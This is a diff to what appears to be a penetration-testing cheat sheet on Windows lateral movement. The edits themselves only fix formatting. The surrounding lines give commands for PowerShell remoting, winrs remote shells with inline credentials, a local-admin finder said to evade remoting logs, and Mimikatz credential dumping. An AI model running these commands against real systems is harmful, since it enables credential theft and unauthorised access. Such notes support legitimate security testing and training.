@@ -34,7 +34,7 @@ C:> Enter-PSSession -ComputerName <computer>
 C:> $remote_computer = New-PSSesion -ComputerName <computer>
 C:> Enter-PSSession -Session $remote_computer
 ```
-- **Rem
+- **Remote Execution**
 ```powershell
 # Remote Execution With Credentials
 c:> $SecPassword = ConvertTo-SecureString '<password>' -AsPlainText -Force
@@ -64,9 +64,9 @@ C:> . .\Find-PSRemotingLocalAdminAccess.ps1
 C:> Find-PSRemotingLocalAdminAccess
 ```
 Uses same port as PSRemoting, and evades Remoting Logging.
-- Execute Remote Command
+- **Execute Remote Command**
 ```powershell
-# USe `cmd`as command to get a shell
+# Use `cmd`as command to get a shell
 C:> winrs -remote:<computer> -u:<domain>\<user> -p:<password> <command>
 ```
 
@@ -76,8 +76,7 @@ Requires Local Admin Privileges on computer where is run.
 ```powershell
 C:> . .\Invoke-Mimikatz.ps1
 ```
-- Dump Credentials on Local Machine
-
+- **Dump Credentials on Local Machine**
 ```powershell
 C:> Invoke-Mimikatz -Command '"sekurlsa::ekeys"'
 ```
